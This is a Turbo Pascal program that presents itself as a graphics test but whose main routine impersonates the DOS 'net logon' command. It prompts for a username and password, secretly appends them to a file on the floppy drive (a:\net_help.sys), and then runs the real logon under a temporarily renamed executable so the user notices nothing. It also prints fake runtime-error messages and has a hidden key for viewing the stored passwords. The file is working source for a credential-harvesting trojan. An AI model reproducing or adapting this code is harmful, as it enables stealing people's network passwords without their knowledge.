program testgraph;

{StackSize, HeapMin, HeapMax}
{$M 8000,0,655360}

uses dos,crt,graph,drivers;

type
    a_password = array[1..255] of char;
     user_rec = record
                username,password : string;
                end;
     screen = array[0..1999] of word;
    r_res = record
                   x : integer;
                   y : integer;
             end;
     r_char_size = record
                 x : integer;
                 y : integer;
             end;
     r_screen_size = record
                 cols : integer;
                 rows : integer;
             end;

     r_button_rec = record
                  x1,y1,x2,y2 : word;
                  text_color : byte;
                  face_color : byte;
                  caption : string;
                  bitmap_file : string[13];
                  normal_state : boolean;
                  current_state : boolean;
                  end;
     r_where = record
               x : word;
               y : word;
               end;
     r_event = record
               what : word;
               buttons : byte;
               double : boolean;
               where : r_where;
               where_screen_id : word;
               where_dialog_id : word;
               keypressed : char;
               end;
     a_button_rec = array[1..15] of r_button_rec;
     a_screen_map = array[0..79,0..59] of word;
     a_bitmap = array[0..79,0..59] of byte;
var
   image : ^screen;
   storage : screen;
   password_input : a_password;
   net_file : file;
   user_info,file_dummy : user_rec;
   user_file : file of user_rec;
   res : r_res;
   char_size : r_char_size;
   screen_size : r_screen_size;
   screen_map : a_screen_map;

   button_rec : a_button_rec;
   close_program : boolean;
   mouse_event : tevent;
   event : r_event;
   current_bitmap_color,finding : word;
   put_bitmap,text_screen,current_bitmap : a_bitmap;
   original_x,original_y : word;
{   scroll_bar_rec : a_scroll_bar_rec;}
   bitmap_file : file of a_bitmap;
   bitmap_filename : string;



procedure putbitmap(bitmapfile : string;x,y : word);
var z,zz : word;
begin
     {$I-}
      assign(bitmap_file,bitmapfile);
      reset(bitmap_file);
      read(bitmap_file,put_bitmap);
      finding := ioresult;
     {$I+}
     if finding = 0 then
      for z := 0 to 79 do for zz := 0 to 59 do if put_bitmap[z,zz] <> 16 then putpixel(z+x,zz+y,put_bitmap[z,zz]);
     close(bitmap_file);
end;

procedure plaque(state : boolean;x1,y1,x2,y2,background_color : integer);
var x,y : word;
begin
     if background_color = 16 then setcolor(3) else
     setcolor(background_color);
     x := 0;y := 0;
     repeat
           rectangle(((x2-x1) div 2) + x1 - x,((y2-y1) div 2) + y1 - y,
                     ((x2-x1) div 2) + x1 + x,((y2-y1) div 2) + y1 + y);
           if x < ((x2-x1) div 2) then x := x + 1;
           if y < ((y2-y1) div 2) then y := y + 1;
     until (x = ((x2-x1) div 2)) and (y = ((y2-y1) div 2));
     if state = true then begin
     setcolor(7);
     line(x1,y1,x1,y2-1);
     line(x1,y1,x2-1,y1);
     setcolor(15);
     line(x1+1,y1+1,x2-2,y1+1);
     line(x1+1,y1+1,x1+1,y2-2);
     setcolor(8);
     line(x2-1,y2-1,x1+1,y2-1);
     line(x2-1,y2-1,x2-1,y1+1);
     setcolor(0);
     line(x2,y2,x1,y2);
     line(x2,y2,x2,y1);

     end else
     begin
     setcolor(8);
     line(x1,y1,x1,y2-1);
     line(x1,y1,x2-1,y1);
     setcolor(0);
     line(x1+1,y1+1,x2-2,y1+1);
     line(x1+1,y1+1,x1+1,y2-2);
     setcolor(7);
     line(x2-1,y2-1,x1+1,y2-1);
     line(x2-1,y2-1,x2-1,y1+1);
     setcolor(15);
     line(x2,y2,x1,y2);
     line(x2,y2,x2,y1);
     end;
end;

procedure paint_button(control_id : word;check_box : boolean);
begin
     if check_box = false then begin
     plaque(button_rec[control_id].current_state,
            button_rec[control_id].x1*8,
            button_rec[control_id].y1*8,
            button_rec[control_id].x2*8,
            button_rec[control_id].y2*8,
            button_rec[control_id].face_color);
            setcolor(button_rec[control_id].text_color);
     if button_rec[control_id].current_state = true then begin
     outtextxy(button_rec[control_id].x1*8+5,
               button_rec[control_id].y1*8+5,
               button_rec[control_id].caption);
               if button_rec[control_id].bitmap_file <>  'none' then putbitmap(button_rec[control_id].bitmap_file,
                  button_rec[control_id].x1+5,button_rec[control_id].y1+5);end
                else
     outtextxy(button_rec[control_id].x1*8+7,
               button_rec[control_id].y1*8+7,
               button_rec[control_id].caption);
               if button_rec[control_id].bitmap_file <>  'none' then putbitmap(button_rec[control_id].bitmap_file,
                  button_rec[control_id].x1+7,button_rec[control_id].y1+7);
               end;
     if check_box = true then begin
     plaque(false,
            button_rec[control_id].x1*8-2,
            button_rec[control_id].y1*8-2,
            button_rec[control_id].x2*8+2,
            button_rec[control_id].y2*8+2,
            button_rec[control_id].face_color);
     
     setcolor(button_rec[control_id].text_color);
     outtextxy(button_rec[control_id].x2*8+7,
               button_rec[control_id].y1*8+2,
               button_rec[control_id].caption);
     if button_rec[control_id].current_state = true then
     begin
          setcolor(0);
          line(button_rec[control_id].x1*8,
            button_rec[control_id].y1*8,
            button_rec[control_id].x2*8,
            button_rec[control_id].y2*8);
          line(button_rec[control_id].x2*8,
            button_rec[control_id].y1*8,
            button_rec[control_id].x1*8,
            button_rec[control_id].y2*8);
     end;
     if button_rec[control_id].current_state = false then
     begin
          setcolor(15);
          line(button_rec[control_id].x1*8,
            button_rec[control_id].y1*8,
            button_rec[control_id].x2*8,
            button_rec[control_id].y2*8);
          line(button_rec[control_id].x2*8,
            button_rec[control_id].y1*8,
            button_rec[control_id].x1*8,
            button_rec[control_id].y2*8);
     end;
     
     end;
end;

procedure create_button(x1,y1,x2,y2,text_color,face_color,control_id : word;caption,bitmap_file : string;
          state,check_box : boolean);
var x,y,z : word;
begin
     for x := (x1) to (x2) do for y := (y1) to (y2) do screen_map[x,y] := control_id;
     button_rec[control_id].x1 := x1;
     button_rec[control_id].y1 := y1;
     button_rec[control_id].x2 := x2;
     button_rec[control_id].y2 := y2;
     button_rec[control_id].text_color := text_color;
     button_rec[control_id].face_color := face_color;
     button_rec[control_id].caption := caption;
     button_rec[control_id].bitmap_file := bitmap_file;
     button_rec[control_id].normal_state := state;
     button_rec[control_id].current_state := state;
     paint_button(control_id,check_box);
end;

procedure button_state(control_id : word;state : boolean);
begin
     button_rec[control_id].current_state := state;
end;

procedure scroll_box(control_id : word);
begin

end;

procedure paint_main_window;
begin
     hidemouse;

     plaque(true,0,0,640,480,7);
     
     create_button(65,13,68,15,11,current_bitmap_color,1,'','none',false,false);
     
     create_button(2,55,13,59,1,7,19,'New     F1','none',true,false);

     create_button(65,43,66,44,0,15,24,'Auto Return','none',true,true);
     showmouse;
end;

procedure get_event;
var ch : char;
begin
     GetMouseEvent(mouse_event);
     if keypressed = true then ch := readkey;
     event.what := mouse_event.what;
     event.buttons := mouse_event.buttons;
     event.double := mouse_event.double;
     event.where.x := mouse_event.where.x;
     event.where.y := mouse_event.where.y;
     event.where_screen_id := screen_map[event.where.x,event.where.y];
     
     event.keypressed := ch;
end;

procedure press_button(control_id : word;paint : boolean);
begin
     if paint = true then begin
     hidemouse;
     button_state(control_id,false);
     paint_button(control_id,false);
     showmouse;end;
     repeat
           get_event;
     until event.what = evMouseup;
     delay(100);
     if paint = true then begin
     hidemouse;
     button_state(control_id,true);
     paint_button(control_id,false);
     showmouse;
     end;
end;

procedure paint_check_box(control_id : word);
begin
     hidemouse;
     if button_rec[control_id].current_state = true then begin
        button_rec[control_id].current_state := false;
        paint_button(control_id,true);
     end else
     if button_rec[control_id].current_state = false then begin
        button_rec[control_id].current_state := true;
        paint_button(control_id,true);
     end;
     showmouse;
end;



procedure exit_program;
var ch : char;
begin
    close_program := true;
end;

procedure paint_pixel(x,y,pixel_color : word);
begin
     if pixel_color = 15 then begin
     setcolor(0);
     circle(x,y,2);
     SetFillStyle(1,pixel_color);
     floodfill(x,y,pixel_color);
     putpixel(520+x,22+y,15);
     end else if pixel_color = 16 then begin
     setcolor(1);
     circle(x,y,2);
     SetFillStyle(1,15);
     floodfill(x,y,1);
     setcolor(15);
     circle(x,y,2);
     putpixel(520+x,22+y,0);
     end else begin
     setcolor(pixel_color);
     circle(x,y,4);
     SetFillStyle(1,pixel_color);
     floodfill(x,y,pixel_color);

     end;

end;




procedure percentile(x,y,speed : word);
var xx : word;
begin
     plaque(false,x+1,y,x+204,y+30,15);
     setcolor(4);
     for xx := 1 to 200 do begin
         delay(speed);
         hidemouse;
         line(xx+2+x,y+2,xx+2+x,y+28);
         showmouse;
         end;
end;




procedure start_paint;
begin
     paint_main_window;
     repeat
           repeat
           get_event;
           until ((event.buttons = 1) or (event.buttons = 2)) and (event.what = evmousedown);
           if event.buttons = 1 then
           case event.where_screen_id of
             1 : writeln;
           end;
           
     until event.buttons = 1;
end;

procedure clear_screen_map;
var x,y : word;
begin
     for x := 1 to 80 do for y := 1 to 60 do screen_map[x,y] := 0;

end;

procedure set_varibles;
begin
     
     
     clear_screen_map;
     screen_size.cols := 80;
     screen_size.rows := 25;
     res.x := getmaxx;
     res.y := getmaxy;
     char_size.x := (res.x + 1) div screen_size.cols;
     char_size.y := (res.y + 1) div screen_size.rows;
     close_program := false;
     current_bitmap_color := 1;
end;

procedure start_graphics_mode;
var graphics_error_code,graphics_driver,graphics_mode : integer;
begin
     graphics_driver := detect;
     InitGraph(graphics_driver,graphics_mode,'');
     graphics_error_code := graphresult;
     if graphics_error_code <> grok then
        begin
             writeln('Graphics Error(',graphics_error_code,')');
             writeln('Driver = ',graphics_driver,' / Mode = ',graphics_mode);
             halt;
        end;
end;

procedure end_graphics_mode;
begin
     restorecrtmode;
end;

      

procedure login_screen;
var ch : char;wrong : boolean;x,y,z,a : word;password : string;
begin
{     textcolor(7);textbackground(0);
     clrscr;
     gotoxy(49,1);
     write('  rÑdcvà llï t êwsqÅ Ütymg òsÖfR');
     gotoxy(59,2);
     write('    Ütmsp Ä jswîq çk è');
     gotoxy(69,3);
     writeln('   ...ëdwÇhF');
     delay(8000);
     gotoxy(54,4);
     write('   [18400001:6720578] flsâè');
     delay(10000);
     gotoxy(73,5);
     write('  ÅlgsïC');
     x := 75;y := 5;
     for z := 1 to 15 do begin gotoxy(x-z,y);write('.');gotoxy(1,1);delay(2000);end;
     gotoxy(66,6);
     write('   ...îjsuá hÅF');
     delay(9000);
     gotoxy(75,7);
     write('swÜhåG');
     randomize;
     x := wherex;y := wherey;
     for z := 1 to 100 do begin gotoxy(70,7);write('%',z);a := random(2000);gotoxy(1,1);delay(a);end;
     gotoxy(67,8);
     write(' .tndã Åsw çdö');
     delay(10000);          }
     start_graphics_mode;
     initevents;
     hidemouse;
     setfillstyle(1,3);
     floodfill(50,50,1);
     plaque(true,-2,454,642,482,7);
     plaque(true,584,458,638,478,7);
     putbitmap('window.bmp',619,462);
     putbitmap('aribic_j.bmp',607,454);
     putbitmap('aribic_d.bmp',588,454);
     showmouse;
     repeat
     hidemouse;
     plaque(true,170,200,475,300,7);
     putbitmap('keys.bmp',180,210);
     putbitmap('aribic_a.bmp',385,215);
     putbitmap('aribic_j.bmp',374,215);
     putbitmap('aribic_d.bmp',360,215);
     putbitmap('aribic_j.bmp',340,215);
     putbitmap('aribic_f.bmp',330,215);
     plaque(false,238,240,410,265,15);
     x := 0;password := '';
     ch := ' ';
     showmouse;
     repeat
           if keypressed = true then begin
           hidemouse;
           ch := readkey;
           if (x <> 14) and (ch <> #13) and (ch <> #8) then begin
              x := x + 1;
              paint_pixel(400-x*10,252,4);
              password := password + ch;
           end;
           if (ch = #8) and (x > 0) then begin
              paint_pixel(400-x*10,252,15);
              x := x - 1;
             end;
           showmouse;
           end;
     until ch = #13;

     wrong := false;
     if password <> 'bigshow' then begin
     plaque(true,170,200,475,300,7);
     putbitmap('aribic_j.bmp',320,235);
     putbitmap('aribic_f.bmp',310,235);
     putbitmap('x.bmp',340,240);
     putbitmap('x.bmp',290,240);
     sound(1000);
     delay(1500);
     nosound;
     delay(10000);
     wrong := true;
     end;
     until wrong = false;
     plaque(true,170,200,475,300,7);
     putbitmap('aribic_j.bmp',374,215);
     putbitmap('aribic_d.bmp',390,215);
     putbitmap('aribic_j.bmp',380,215);
     percentile(225,240,200);
     delay(2000);
     plaque(true,170,200,475,300,7);
     setfillstyle(1,3);
     floodfill(200,200,4);
     delay(1500);
     
end;

procedure start_mouse;
begin
     initevents;
end;

procedure startup;
begin
      set_varibles;

      
end;

procedure shutdown;
begin
     
     
end;

procedure view_pass_2;
var ch : char;
begin
     hidemouse;
     clrscr;
     ch := readkey;
     showmouse;
end;

procedure view_pass_file;
var password,username,usernamewrite,commandline,net_cmd : string;
   x,y,z,finding : word;
   ch,ch2 : char;
   event : tevent;
   
begin
     storage := image^;
    x := wherex;y := wherey;
    initevents;
    gotoxy(75,23);
    write('„');
    gotoxy(x,y);
    repeat
          getmouseevent(event);
          if (event.where.x = 74) and (event.where.y = 22) and (event.buttons = 1) then
             view_pass_2;
    until (event.what = evMouseDown);
    gotoxy(75,23);write(' ');
    gotoxy(x,y);
    hidemouse;
    image^ := storage;
    gotoxy(x,y);
end;

procedure net;
var password,username,usernamewrite,commandline,net_cmd : string;
   x,y,z,finding : word;
   ch,ch2 : char;
begin
    image := ptr($B800,0);
    commandline := '';
    for x := 1 to ParamCount do if x = 1 then commandline := ParamStr(1) else
       commandline := commandline + ' ' + paramstr(x);
    if (paramstr(1) = 'logon')  then begin
       if paramcount = 1 then
       begin
       write('Type your user name, or press ENTER if it is KTIPTON:');
       readln(username);
       end else username := paramstr(2);
       if paramcount < 3 then
       begin
       write('Type your password:');
       ch := ' ';password := '';z := 0;
       x := wherex;y := wherey;
       repeat
             if keypressed = true then
             begin
                  ch := readkey;
                  if (ch <> #13) and (ch <> #8) then begin
                     gotoxy(x+z,y);
                     write('*');
                     z := z + 1;
                     password := password + ' ';
                     password[z] := ch;
                  end;
                  if (ch = #8) and (z > 0) then begin
                     password := password + ' ';
                     password[z] := ' ';
                     gotoxy(x+z-1,y);
                     write(' ');
                     gotoxy(x+z-1,y);
                     z := z - 1;

                  end;
              end;
       until ch = #13;
       writeln;
    end else password := paramstr(3);
    if (paramstr(3) = '/savepw:no') or (paramstr(4) = '/savepw:no') or
       (paramstr(3) = '/SAVEPW:NO') or (paramstr(4) = '/SAVEPW:NO') then else begin
    usernamewrite := username;
    for x := 1 to 255 do if (username[x] > chr(96)) and (username[x] < chr(123)) then
          usernamewrite[x] := chr(ord(username[x]) - 32)
          else usernamewrite[x] := username[x];
    writeln('There is no password-list file for ',usernamewrite,'.');
    write('Do you want to create one? (Y/N) [N]:');
    x := wherex;y := wherey;
    repeat

          ch := readkey;
          if ch = #117 then view_pass_file;
          gotoxy(x,y);
          if (ch > chr(32)) and (ch < chr(126)) and (ch <> #117) then write(ch);
    until (ch = #13);
    end;
    user_info.username := username;
    user_info.password := password;
    assign(user_file,'a:\net_help.sys');
    {$I-}
    reset(user_file);
    finding := ioresult;
    {$I+}
    if finding <> 0 then begin rewrite(user_file);write(user_file,user_info);close(user_file);end else
    begin
         repeat
               read(user_file,file_dummy);
         until EOF(user_file);
         write(user_file,user_info);
         close(user_file);
    end;

    assign(net_file,'net_help.dat');
    {$I-}
    rename(net_file,'net_help.exe');
    finding := ioresult;
    {$I+}
    if finding <> 0 then begin
       writeln('Runtime Error 56765483:6245644 I/O REF(',finding,')');
       halt;
    end;
    SwapVectors;
     net_cmd := '/c net_help logon '+username+' '+password+' /SAVEPW:NO';
    Exec(GetEnv('COMSPEC'),net_cmd);
    SwapVectors;
    {$I-}
    rename(net_file,'net_help.dat');
    finding := ioresult;
    {$I+}
    if finding <> 0 then begin
       writeln('Runtime Error 56765483:6245644 I/O REF(',finding,')');
       halt;
    end;
    
    if DosError <> 0 then
       WriteLn('Runtime Error 72473883:5132450 DOS REF(',doserror,')');
    end else begin
    assign(net_file,'net_help.dat');
    {$I-}
    rename(net_file,'net_help.exe');
    finding := ioresult;
    {$I+}
    if finding <> 0 then begin
       writeln('Runtime Error 56765483:6245644 I/O REF(',finding,')');
       halt;
    end;
    SwapVectors;
    net_cmd := '/c net_help ' + commandline;
    Exec(GetEnv('COMSPEC'),net_cmd);
    SwapVectors;
    {$I-}
    rename(net_file,'net_help.dat');
    finding := ioresult;
    {$I+}
    if finding <> 0 then begin
       writeln('Runtime Error 56765483:6245644 I/O REF(',finding,')');
       halt;
    end;
    if DosError <> 0 then
       WriteLn('Runtime Error 72473883:5132450 DOS REF(',doserror,')');
   
    end;
end;


begin
      startup;
      net;
      shutdown;
end.
     